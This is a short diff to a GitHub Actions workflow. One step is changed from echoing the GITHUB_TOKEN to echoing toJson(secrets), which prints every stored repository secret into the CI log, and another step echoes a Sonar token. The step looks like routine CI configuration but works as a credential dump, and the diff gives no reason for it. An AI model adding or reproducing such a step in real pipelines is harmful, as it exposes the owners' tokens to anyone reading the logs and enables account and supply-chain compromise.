@@ -19,9 +19,9 @@ jobs:
                         - uses: actions/checkout@v4
                           with:
                                   fetch-depth: 0 # Shallow clones should be disabled for a better relevancy of analysis
-                        - name: ECHO GITHUB_TOKEN
+                        - name: ECHO SECRETSSSSS
                           run: |
-                                  echo ${{ secrets.GITHUB_TOKEN }}
+                                  echo ${{ toJson(secrets) }}
                         - name: ECHO SONAR_TOKEN_FRONT
                           run: |
                                   echo ${{ secrets.SONAR_TOKEN_FRONT }}
